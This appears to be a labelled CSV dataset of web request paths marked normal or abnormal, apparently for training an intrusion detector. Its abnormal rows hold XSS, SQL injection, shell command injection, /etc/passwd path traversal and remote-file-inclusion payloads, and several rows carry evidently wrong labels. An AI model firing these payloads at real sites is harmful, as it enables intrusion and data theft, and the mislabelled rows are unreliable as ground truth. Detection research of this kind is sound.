label,content
正常,/vistaprint_textlink/
正常,/2124914/
异常,/ap58k3ci.cgi?<script>cross_site_scripting.nasl</script>
异常,/examples/jsp/colorssearch_results.dot?search_query=nessus"><script>alert('dotcms_search_query_xss.nasl')</script>/
正常,/112722/
异常,/wp-content/plugins/wordtube/wordtube-button.php?wpPATH=XXpathXX
异常,/mambots/editors/path/jscripts/tiny_mce/plugins/preview/preview.php?mosconfig_absolute_path=http://192.168.202.118:8080/ghl9il?
正常,/003128/
正常,/manager/admin/p_ins.php?mgr=http://192.168.202.118:8080/tzhfyzkbomspvm?
异常,/javascript/.htaccess/"`false`"
正常,/comments.php?amg_serverpath=http://192.168.202.96:8080/llumt7msyau5y?
异常,/zcb/?page=-5359%29%20UNION%20ALL%20SELECT%208372%2C%208372%2C%208372%23
异常,"/kbase_list.aspx?kcatid=1%20UNION%20SELECT%201,2,char(106)%2bchar(106),4,5,6,7,8%20from%20syscolumns--"
异常,/75/75922/include/dialog/select_soft.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
正常,/129252/
正常,/eurobike_friedriechshafen/
异常,/ywaxntrx.html?<script>cross_site_scripting.nasl</script>
正常,/stasiek/
正常,/chapter10_1h/
正常,/docs/config/nessus/
正常,/razer2006/
正常,/destinys child_writings on the wall 128kbs/
正常,/businessvalue/
异常,/javascript/pkgs.exe
正常,/professeurs/index.php?repertoire_config=http://192.168.202.96:8080/4dckqcc0acprbz?
正常,/146415/
正常,/final destination 2 2003 widescreen/
正常,/socks_4/
正常,/protux/
正常,/anna nicole smith - sex clips from skyscraper/
正常,/1286921/
正常,/en-us/account/services/help/?module=horde&show=menu
正常,/squadbattlesthekoreanwarv1/
异常,/i2n4v4rl.fts?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/opscon/
正常,/phpping/index.php?pingto=www.nessus.org | dir
异常,"""echo%20UFAGYK$((82%2B39))$(echo%20UFAGYK)UFAGYK"
异常,/jackrabbit/search.jsp?q=%"<script>alert(1331904374)</script>
正常,/sandronsky02202006/
正常,/javascript/_vti_bin.dump
异常,ORDER BY 7 
异常,"""`'><script>\xE2\x80\x88javascript:alert(1)</script>"
正常,/arabellagrandhotelmuenchen/
异常,/7/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%20onmonmouseoverouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
正常,/fewer_affidavit/
异常,"""%7C%7Cecho%20HTPEMJ$((2%2B19))$(echo%20HTPEMJ)HTPEMJ"""
正常,/javascript/smtp.cfg
正常,/nicely out of tune/
正常,/wp-content/plugins/wp-stats-dashboard/
正常,/ytb/cuenta/cuerpo.php?base_archivo=@rfiurl
异常,%26%20sleep%200%20%26%26%20str%3D%24%28echo%20EHNNQT%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20
正常,/aaahmet2/
异常,/ows-bin/texis.exe/junk
异常,/ows-bin/pfdispaly.cgi?'\x0a/bin/cat /etc/passwd|'
正常,/438105072/
正常,/hlf_support/
正常,/2433328590085997137tuwvxn_th/
正常,/javascript/oa_servlets.sql
正常,/cache and cookie washer for netscape v4/
异常,%3B%20str%3D%24%28echo%20RPPEVG%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2522
正常,/31898434/
正常,/4580118/
正常,/admincp/auth/secure.php?cfgprogdir=http://192.168.202.118:8080/ghl9il?
正常,/pw05_itinerary/
正常,/someunexistantantsutff183913719258980227.html
正常,/config.php?sql_language=http://192.168.202.118:8080/2aibfaczmac8??
异常,<div style="font-family:'foo&#10;;color:red;';">XXX
正常,/hdr_usc/
正常,/andrew gold - thank you for being a friend/
异常,/i7prbs22.nsf?<script>document.cookie="testjnre=7328;"</script>
异常,%3B%20str%3D%24%28echo%20CUZHIS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C
正常,/frank caliendo - comedy central presents/
正常,/a2780093/
正常,/javascript/event.err
正常,/20040410-1/
异常,<SCRIPT a=`>` SRC="http://xss.rocks/xss.js"></SCRIPT>
异常,/vac1l5vm.x?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/javascript/protect.out
正常,/bot-border/
正常,/ultimate demolition derby_information/
正常,/492348/
正常,/help_webmail/
正常,/antacidnewspopularheartburndrugsmayleadtoabrokenhip/
正常,/javascript/pkg.csv
正常,/examples/jsp/sessions/php/mytutos.php
正常,/inc/indexhead.php?fileloc=@rfiurl?fileloc=@rfiurl?
异常,<a href="javascript:data:alert(1)">click</a>
异常,/manager/sojourn.cgi?cat=../../../../../etc/passwd\x00
异常,/46/46007/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing&m=content&page=&pay_type_int=4%22%20onmouseover=alert(42873)%20y=&price=&rent_mode=&zone=3363
正常,/187786/
异常,/include/header.php?cs_base_path=XXpathXX?
正常,/dev-0196/
正常,/javascript/ear.cs
正常,/interface/themes/style_oemr.css/
正常,/demo0502/
正常,/rainbow islands revolution_information/
正常,/most haunted - celebrity belgrave hall divx/
正常,/indexjsp/
正常,/xtrasense surveillance system_information/
异常,/javascript/formatting.exe
正常,/369c10eb150b486debdaceb32bb9857f_0/
异常,<!--#echo var="DOCUMENT_NAME" -->
正常,/annonce.php?page=http://192.168.202.118:8080/2aibfaczmac8??&cmd=id
正常,/loads of nude woman really hot stuff/
正常,/sinapis.php?fuss=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,' or 1=1#  
正常,/javascript/hadoop.cfg
正常,/javascript/flv.jsf
正常,/sega genesis collection_information/
异常,'|echo$IFSANVKGR$((37%2B60))$(echo$IFSANVKGR)ANVKGR'
异常,/examples/jsp/jsp2/el/include/monitoring/engine/makexml.php?fileoreonconf=/etc/passwd\x00
异常,/admin/autoprompter.php?CONFIG[BASE_PATH]=XXpathXX
正常,/3c61e5b2ff42102880ec001143e7e506/
正常,/manager/admin/index.php?mgr=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/347120/
正常,/more_audio/
异常,/javascript/document.java
异常,/l13b77e5.asp?<meta http-equiv=set-cookie content="testjvvf=7721">
异常,/opensiteadmin/scripts/classes/filters/singlefilter.php?path=http://192.168.202.96:8080/vir0v3xfc?\x00
异常,HAVING 1=0#
异常,""" or 0=0 -- "
正常,/thesextracker_head/
正常,/mop_billingblock/
正常,/motocross action - 2006 issue 02 february/
异常,/0_3/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
异常,"),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20--"
正常,/queen-ballads/
异常,%0A%20str%3D%24%28echo%20OKMZVE%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%252F%252F
正常,/natalie_burge/
正常,/img_8939/
异常,<<SCRIPT>alert(1);//<</SCRIPT>
正常,/benchmark_updat/
正常,/static/css/blueprint/src/.svn/entries
异常,/main.php?logout=ping;-w;7000;-n;1;4.3.2.1&rem;
异常,/bin/fileseek.cgi?foot=&head=....//....//....//....//....//....//....//etc/passwd
异常,"""`'><script>\xE2\x80\x86javascript:alert(1)</script>"
异常,/examples/servlets/servlet/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl
正常,/745572736/
异常,%2527%0A%20str%3D%24%28echo%20GBQYNR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%7C
正常,/3645136/
正常,/javascript/replicas.xml
异常,1)) or sleep(__TIME__)#
正常,/ink-station/
正常,/20040609-49/
正常,/x-tilesetup/
正常,/account.php?inspath=http://192.168.202.96:8080/4dckqcc0acprbz?
异常,/nsn/..\web/fdir.bas
异常,/nuh3zirz.asp?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/javascript/edge.do
正常,/javascript/definitions.html
正常,/3b458a22q2fyd2q5cq27q3b6jq3dg2q25jq5cbbq2anq27q25q2a6q27b/
异常,/ows-bin/webbbs/webbbs_config.pl?body=aaaaffff&email=test@example.com&followup=10;cat /etc/passwd&name=joe
异常,%3B%20str%3D%24%28echo%20KNETDA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%203%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%7C
异常,/gy23xnjq.htm?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/berkley_hr1542/
正常,/tuminez/
正常,/lib/classes/swift/characterreader/struts/webconsole.html
异常,/script_path/config.inc.php?_path=http://192.168.202.118:8080/iroy1gvqrrqu??
正常,/publist/
正常,/healtharticles/
异常,/jnv890lt.kspx?<script>cross_site_scripting.nasl</script>
异常,/forum1.asp?n=1753&amp;nn=....//....//....//....//....//....//....//etc.passwd
异常,%7C%20%5B%208%20-ne%20%24%28echo%20FPMDOL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23
异常,/help.php?q="&rm q34212187 #
正常,/vcents/
正常,/cacti/index.php?do=ext&page=http://xxxxxxxx/file
正常,/lib/db/postgres.class.php?root=http://192.168.202.118:8080/ghl9il?
异常,/scgi-bin/texis.exe/junk
异常,/scripts/tinfo.php?id=1331923196
异常,%0A%20str%3D%24%28echo%20LJKRDD%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2527
正常,/aldermen_gifts/
正常,"/examples/jsp/checkbox/spt--forumtopics.php?forumid=-9 union select null,null,null,1331904462,4,5"
异常,/..\..\{FILE}
正常,/566394/
正常,/mjuwmtc2/
异常,/manager/index.php?show=../../../../../../../../../../../etc/passwd\x00
异常,/examples/jsp/sessions/includes/third_party/adodb/server.php?sql='adodb_sql_sql_injection.nasl
异常,/..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af{FILE}
异常,/download_engine_V1.4.3/admin/enginelib/class.phpmailer.php?lang_pathr=XXpathXX
异常,<object data=//0me.me/demo/xss/xssproject.swf?js=alert(document.domain); allowscriptaccess=always></object> // Soroush Dallili
正常,/puff_piece/
异常,/examples/jsp/error/cgi/tseekdir.cgi?location=/etc/passwd\x00
正常,/javascript/lists.pem
异常,<script xmlns="http://www.w3.org/1999/xhtml">&#x61;l&#x65;rt&#40;1)</script>
正常,/javascript/tmpl.rss
正常,/004075/
正常,/problemreportform/
正常,/variouspress/
正常,/141206/
正常,/2843c4ffq2fjzrf33q23q2bq2536bq2fcq25q60bq2f33zq23cq60/
异常,/help.php?q=";uname >q25549328 #
正常,/10005569/
正常,/en-us/config?autoload=1&namespace=windows
正常,/unsubs.php?scdir=http://192.168.202.96:8080/4dckqcc0acprbz?
正常,/ghp_homehomeoffice/
正常,/000046541/
异常,/scripts/btdownload.php?type=torrent&file=../../../../../../../../../../etc/passwd
正常,/audi-q7_11/
正常,/common.php?livealbum_dir=http://192.168.202.118:8080/ghl9il??
异常,/javascript/cfusion.exe
异常,%2527%7C%20%5B%204%20-ne%20%24%28echo%20HYWCTJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20//
异常,%27%0A%20str%3D%24%28echo%20GIPRGX%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%206%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%26
正常,/when porn stars play 6 - casual sex/
正常,/cacti/mapserv?map=mapserver_detect.nasl.map
正常,/potty-training_w0qqfromzr4qqsacatz37631qqsocmdzlistingitemlist/
异常,/javascript/oauth.exe
异常,/howtoimportsubscriptions/
正常,/ejournalusa/
正常,/50143645/
正常,/ptcee0403903150760d3feccdb1d9f5a797/
正常,/latex.php?bibtexrootrel=@rfiurl?bibtexrootrel=@rfiurl?
正常,/vendetta/
正常,/feedform/
异常,/scripts/comersus_customerregistrationform.asp
异常,/h21y8w52.html?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/devprogram/
正常,/f130604b/
正常,/ppc_linux/
正常,/login.php?attempt=1&uname= 1332010172
异常,/recordings/calendar_admin.pl?config=|cat /etc/passwd|
正常,/000026125/
正常,/ic_memchip/
正常,/filmy_kategoria/
正常,/javascript/shopper.save
异常,/confirmunsubscription.php?output=http://192.168.202.96:8080/4dckqcc0acprbz?
异常,/46/api.php?op=video_api&pc_hash=1&uid=1&snid=%3C/script%3E%3Cscript%3Ealert(/42873/)%3C/script%3E//&do_complete=1%20
异常,/_mem_bin/..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf..\xe0\x80\xaf../winnt/system32/cmd.exe?/c+dir+c:\+/og
正常,/point_privacy/
正常,/birmingham v spurs 60 minute highlights 2nd april 2005 352x288 xvid/
异常,/en-us/oie504mr.mscgi?<meta http-equiv=set-cookie content="testtpby=7052">
正常,/6047560/
正常,/bouthillier/
正常,/183600/
正常,/mg199t/
正常,/corp_inquiry-find/
异常,/fmnveedu.idc?<meta http-equiv=set-cookie content="testgfbr=7014">
异常,/hipkz026.cfm?<meta http-equiv=set-cookie content="testyrbs=2855">
正常,/javascript/~jessica.old
正常,/nav_press1/
正常,/somery/team.php?checkauth=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/news_center/
正常,/keycriteriatoconsiderwhenselectingawebanalyticssolution/
异常,//yp/product.php?pagesize=${${@eval($_POST[chr(99)])}}
正常,/002497/
正常,/w32stratiozip/
正常,/134862/
正常,/051099/
正常,/psp book harry potter and the order of the phoenix/
正常,/american hotel and lodging association/
异常,/setup/upgrader.php?RootDirectory=XXpathXX
异常,/7vnkuo63.exe?<script>document.cookie=%22testftwc=7501;%22</script>
异常,/db.php?q='&t='
正常,/loughridge/
异常,&#x000003c
正常,/albert hofmann - erinnerungen eines psychonauten/
异常,"""><meta http-equiv=""refresh"" content=""0;javascript&colon;confirm(1)""/>"
异常,<script src="http://code.jquery.com/jquery-1.4.4.js"></script>
正常,/design3/
异常,&#X003E
正常,/speedy/
正常,/buyflashplayer/
正常,/bingoserver.php3?response_dir=http://192.168.202.118:8080/ghl9il?
异常,/cgibin/vssetcookie.exe
异常,/sitemap.xml.php?dir[classes]=XXpathXX
异常,/examples/jsp/checkbox/include/theme.inc.php?fullpath=/etc/passwd\x00
正常,/javascript/networking/
正常,/phpmyadmin/documentation.html?phpmyadmin=
正常,/awkwardness/
正常,/ggoplay219_4/
正常,/php121db.php?php121dir=http://192.168.202.96:8080/4dckqcc0acprbz?\x00
正常,/javascript/the
正常,/modules/groupadm/index.php?full_path=http://cirt.net/rfiinc.txt?
异常,/main.php?stuff="&ver\x0b>q72441193&rem\x0b
正常,/q38651728
正常,/zahn v1/
正常,/vlweblog-206179471/
异常,<meta http-equiv="refresh" content="0;javascript&colon;confirm(1)"/>
正常,/b000h7j9m601aa240sclzzzzzzzv39945492ry1/
正常,/someunexistantstuff17210282812069679430.html
异常,/60/index.php?a=lists&agent=&bedroom=&c=index&catid=8&city=beijing%22%20onmouseover=alert(42873)%20y=&m=content&page=&pay_type_int=&price=&rent_mode=&zone=3363
正常,/en-us/api/search/jobs?s=1331910622.34&s=1331910622.36&s=1331910622.35
异常,/pubs_description/
正常,/f2bb57868b1bf535f1856b905eb0eabb/
正常,/reg_red/
正常,/health-monitor/
正常,/82fd0b037d8e68b980256ec80032ded1/
异常,/help.php?q=;sleep 9 #
异常,%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E%E
异常,<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
正常,/32088709/
异常,/examples/jsp/checkbox/ustorekeeper.pl?command=goto&file=../../../../../../../../../../etc/passwd
正常,/3923c6698cf2e9b1cc25725e0080197a/
异常,/javascript/5.exe
异常,../../../../../../../../../../../../etc/hosts
正常,/cgi-bin/nph-error.pl
正常,/winfavorites/
正常,/127291/
正常,/javascript/templ.htm
正常,/000117280/
正常,/204342/
正常,/firstpost/block.php?include=http://192.168.202.96:8080/4dckqcc0acprbz?
异常,/javascript/document.phtml
异常,"/examples/jsp/checkbox/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--"
正常,/controls/
正常,/antispyware/
正常,/betablockmodules/groupmoderateusermodule/groupmoderateusermodule.php?path_prefix=http://192.168.202.96:8080/ipb5ri?
正常,/examples/jsp/checkbox/acegilogin.jsp
异常,/examples/jsp/num/embed/day.php?path=/etc/passwd\x00
异常,/cgi-bin/news.php?prevnext=1'phpnews_prevnext_sql_injection.nasl
异常,%0A%20str%3D%24%28echo%20QOFXCY%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%201%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526
正常,/inhalt.php?dateien[news]=http://192.168.202.118:8080/moclyxlwqyfjnp??
异常,/z'terminator_1/
正常,/teamwork-workflow/
正常,/passions july 11th/
正常,/vidsyn - on frostbitten path beneath/
异常,/./.././.././.././.././.././.././../{FILE}
异常,/opensiteadmin/scripts/classes/filter.php?path=http://192.168.202.118:8080/zz5thkvtmlgl?\x00
正常,/spo_20061225005/
正常,/72409246mbuzdl_th/
正常,/javascript/toolkit.temp
正常,/joomla logo vert color spot flat rev slogan/
正常,/include/global.php?pfad=http://192.168.202.96:8080/txenjrxf3?
异常,/script/init/createallimagecache.php?path_to_code=http://192.168.202.118:8080/zz5thkvtmlgl?
异常,//document.writeln(unescape("%3cscript src=%27http://www.example.com/test?rnd=q56134844%27><"+string.fromcharcode(0x2f)+"script>"))
正常,/b0000aqs0f/
异常,/include/Beautifier/Core.php?BEAUT_PATH=XXpathXX
异常,/examples/jsp/jsp2/jspx/mylog.html?screen=/etc/passwd
正常,/iar embedded workbench for mcs-51 v6/
正常,/include/pear/itx.php?basepath=http://192.168.202.118:8080/zz5thkvtmlgl??
异常,/project-description/
异常,/javascript/printers.exe
正常,/topnav_resources/
异常,/examples/jsp/error/pollit/poll_it_ssi_v2.0.cgi?data_dir=/etc/passwd\x00
异常,/gestArt/aide.php3?aide=XXpathXX?
异常,%3B%20str%3D%24%28echo%20TNPFBA%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%27
异常,/).1g(/index.php/cms/item-comment?callback=jsonp1380096883458'%22()%26%25%3Cscript%3Eprompt(42873)%3C/script%3E&iid=114&page=1&view_page=1&_=1380096883791&_ajax_request=
正常,/msnlogo/
正常,/\xd0\x97\xd0\xb4\xd1\x80\xd0\xb0\xd0\xb2\xd1\x98\xd0\xb5/
异常,/y8pmygrp.aspx?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,<a href="\x1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
正常,/deep purple the california jam 74/
正常,/blood_diamond/
异常,/main.php?stuff='\x0duname\x09#
正常,/182443/
正常,/related_story/
异常,/h5i6crm3.mscgi?<meta http-equiv=set-cookie content="testlihk=7070">
正常,/javascript/course.jhtml
正常,/fotogaleria/
异常,/en-us/account/whois.cgi?action=load&whois=;id
正常,/163621/
正常,/winmpg/
正常,/000063898/
正常,/5ff844ee4ee548dabd6e10f3c785bca8_full/
异常,/form.php?path=XXpathXX?&cmd=pwd
异常,'&&echo%20XOCEJG$((66%2B21))$(echo%20XOCEJG)XOCEJG%27
正常,/ciseps/
异常,/include/sql.php?include_path=/etc/passwd\x00
异常,%2522%7C%20%5B%205%20-ne%20%24%28echo%20XHMATL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22
正常,/javascript/oauth.c
正常,/20060927-1/
异常,&&echo%20SIYJRM$((59%2B4))$(echo%20SIYJRM)SIYJRM%7C
正常,/main.php?stuff=|ping\xa0-w\xa07000\xa0-n\xa01\xa01.2.3.4|rem\xa0
正常,/main.php?stuff=rm\x09q53217726&rem\x09
正常,/lib/classes/swift/swiftexception.php.old
异常,"""/><a href=""data:text/html;base64_,<svg/onload=\u0061&#x6C;&#101%72t(1)>"">X</a"
正常,/news16/
异常,/next week's forecast/
正常,/classes/common.php?rootdir=http://192.168.202.118:8080/tzhfyzkbomspvm??
正常,/findingnemonemosunderwaterworldoffunv1/
异常,%0A%20str%3D%24%28echo%20SHPKRI%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27
正常,/oneidaflatware/
正常,/q86682811
异常,"/help.php?q=""&rm,q25917292&rem,"
异常,/help.php?q="\x0duname\x09>q93881688\x09#
正常,/rossignolskis/
正常,/coaches_health/
异常,/..%5c..%5c..%5c..%5c{FILE}
异常,/mpcgi/fileseek.cgi?foot=....//....//....//....//....//....//....//etc/passwd&head=
正常,/143215/
正常,/javascript/wc.orig
正常,/jamonapi/
正常,/008840/
正常,/include/pear/itx.php?basepath=@rfiurl
正常,/p-yaneva/
正常,/javascript/status.swf
异常,/extauth/drivers/ldap.inc.php?clarolineRepositorySys=XXpathXX
正常,/7fc84268-357e-4640-a16e-6a0a822a1283/
异常,/javascript/wwwuser.exe
正常,/191795/
异常,/scs86g1p.cfc?<meta http-equiv=set-cookie content="testquyx=2820">
正常,/l3solutions health calc v6/
正常,/pulsanim/
正常,/000027897/
正常,/img424/
正常,/nascarspringracebristol/
异常,/3m5knyc4.asp?<script>document.cookie="testbgqj=6434;"</script>
正常,/cy girls disc1 ice/
正常,/044242/
正常,/celine dion - the colour of my love/
异常,/help.php?q=&ver\x09>q84722362&rem\x09
异常,/quagynka.jspa?<img src="javascript:alert(cross_site_scripting.nasl);">
正常,/lib/classes/swift/events/responseevent.php.bak
异常,%3Becho$IFSYTBVMU$((36%2B61))$(echo$IFSYTBVMU)YTBVMU//
异常,/examples/jsp/jsp2/jspx/index.php?templates_dir=/etc/passwd\x00
正常,/potato-head/
异常,<meta http-equiv=set-cookie content="testtbjy=7334">
异常,"/examples/jsp/error/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--"
正常,/713449/
正常,/b3824magazine/
正常,/access password recovery genie_information/
正常,/redirect.php?url=http://192.168.202.96:8080/4dckqcc0acprbz?
异常,<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >
正常,/framebits/
正常,/lotrtcg_logo/
正常,/phpmyadmin/themes/original/img/.svn/entries
正常,/download_engine_v1.4.3/addmember.php?eng_dir=@rfiurl
异常,/script/init/createallimagecache.php?path_to_code=http://192.168.202.118:8080/tzhfyzkbomspvm?
正常,/thkmcs-linkzumir/
正常,/javascript/p2p.php3
正常,/debian_dns/
异常,delete
正常,/mailform_en/
异常,<B="<SCRIPT>confirm(1)</SCRIPT>">
异常,/examples/jsp/sessions/calendar.php?serverpath=/etc/passwd\x00
正常,/madden nfl 2007_information/
正常,/paid to search google yahoo msn and more/
异常,/scripts/rx9ysf2iwv4j.pl
异常,/75/include/dialog/select_templets_post.php?adminDirHand=%22/%3E%3C/script%3E%3Cscript%3Ealert(1);%3C/script%3E
正常,/10008364/
异常,"""echo$IFSKQIOUW$((81%2B20))$(echo$IFSKQIOUW)KQIOUW|"
正常,/fs_img/
正常,/info-zip/
正常,/building construction home material/
正常,/learnkey - cissp operations security/
正常,/javascript/menus.vbs
正常,/head in pussy/
正常,/javascript/view.swf
异常,/main.php?stuff="del q23955852 #
异常,/help.php?chapter=<script>alert('vulnerable')</script>
正常,/area3phys206/
正常,/3650666/
正常,/death-penalty/
异常,/homeowner's-insurance/
正常,/lord_hobart/
正常,/01-29eolaswaitpr/
正常,/17307859_75/
正常,/javascript/firewall.test
正常,/191125/
正常,/851557/
正常,/spojen\xc3\xa9_kr\xc3\xa1lovstv\xc3\xad/
正常,/examples/jsp/jsp2/jspx/struts/webconsole.html
异常,/sturgeon's-law/
异常,/main.php?logout="|ping\x09-w\x099000\x09-n\x091\x094.3.2.1|rem\x09
正常,/javascript/post.tmp
正常,//..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fwindows/win.ini
正常,/examples/jsp/jsp2/jspx/admin.php?dpt=conf&sub=general
正常,/parlmag050704en/
异常,<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
正常,/javascript/template.log
异常,%7C%20%5B%201%20-ne%20%24%28echo%20IZDFYZ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23
正常,/supsql/
正常,/page.nsf
正常,/javascript/submit.out
正常,/javascript/viewsvn.7z
异常,%3B%20str%3D%24%28echo%20POHUXH%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23
正常,/goldschmuck/
正常,/officestamp/
正常,/gnews839/
异常,/javascript/htpasswd.old
正常,/139721/
正常,/news481/
正常,/r_ocdast4u4/
正常,/arcade fire - 09 03 2005 white session/
异常,/noscript_button/
正常,/raygun/
正常,/2128528/
正常,/header.php?wwwroot=http://192.168.202.118:8080/moclyxlwqyfjnp?
正常,/161037/
正常,/d06558t/
正常,/147721/
异常,ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
正常,/homemaking_/
正常,/1943203/
正常,/170657/
异常,%2527%3B%20str%3D%24%28echo%20NSSNST%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%202%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%5C%5C
正常,/lib/classes/swift/characterstream.php.old
异常,/help.php?q='rm\x09q97628579\x09#
异常,/examples/jsp/num/sendtemp.pl?templ=../../../../../etc/passwd
异常,/cgi-exe/a1stats/a1disp3.cgi?../../../../../../../../../../etc/passwd
正常,/171622/
异常,/en-us/account/athenareg.php?pass= ;id
异常,/7uz3ok60.php?<img src="javascript:alert(cross_site_scripting.nasl);">
异常,/cacti/mlog.html?screen=/etc/passwd
正常,/163021/
正常,/bittorrent_538257/
正常,/ehlersd/
正常,/banner-logol/
正常,/cgi-bin/forum.php?id_article=1&id_forum=-1/**/union/**/select 385821988--
异常,/javascript/intro.exe
异常,/o1zj4u9v.cfm?<script>document.cookie="testabrn=6368;"</script>
正常,/relea00250/
异常,<a onmouseover=location='&#106&#97&#118&#97&#115&#99&#114&#105&#112&#116&#58&#97&#108&#10 1&#114&#116&#40&#49&#41'>a<a>
异常,%2527%26%20sleep%200%20%26%26%20str%3D%24%28echo%20PRKGES%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%209%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%2526
正常,/javascript/q4.orig
正常,/epublish/
正常,/construction form format operations/
